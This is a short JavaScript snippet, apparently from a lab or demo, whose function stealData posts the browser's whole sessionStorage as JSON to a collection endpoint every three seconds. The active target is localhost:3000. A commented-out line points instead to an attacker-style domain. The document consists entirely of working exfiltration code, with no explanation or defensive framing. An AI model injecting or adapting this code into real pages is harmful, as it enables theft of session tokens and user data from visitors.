function stealData() {
    console.log('stealData()')
    let url = 
    "http://localhost:3000/data";
    // "https://maliciousfood.com/data";
    fetch(url, {
        headers: {
            "content-type": "application/json"
        },
        method: "POST",
        body: JSON.stringify(sessionStorage)
    })
}

// Steal this data every x seconds
setInterval(() => { stealData() }, 3 * 1000);